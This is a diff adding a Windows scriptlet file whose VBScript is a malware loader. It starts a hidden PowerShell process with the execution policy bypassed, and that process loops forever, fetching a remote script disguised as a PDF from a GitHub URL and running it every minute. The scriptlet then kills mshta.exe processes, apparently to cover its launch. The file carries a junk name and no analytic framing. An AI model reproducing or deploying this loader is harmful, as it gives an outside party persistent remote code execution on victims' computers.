@@ -1,0 +1,33 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="fjzmpcjvqp"
+    progid="fjzmpcjvqp"
+    version="1.00"
+    classid="{204774CF-D251-4F02-855B-2BE70585184B}"
+    remotable="true"
+	>
+</registration>
+
+<script language="VBScript">
+		<![CDATA[
+		
+		 Set ws=CreateObject("WScript.Shell")
+ws.Run "cmd /c start /min powershell -EP b -w hidden -C for(;;){try{IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/riyantigomez/gomez22/master/n4.pdf'))}catch{}Start-Sleep 60}", 0, vbhide
+ 
+Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+Dim colProcesses : Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process")
+Dim objProcess
+For Each objProcess In colProcesses    
+    if (objProcess.name = "mshta.exe") then
+        Set objShell = CreateObject("WScript.Shell")
+        strCmd="TaskKill /f /im " & objProcess.name 
+        objShell.Run strCmd,0,True
+    end if
+Next
+    
+		]]>
+</script>
+
+</scriptlet>
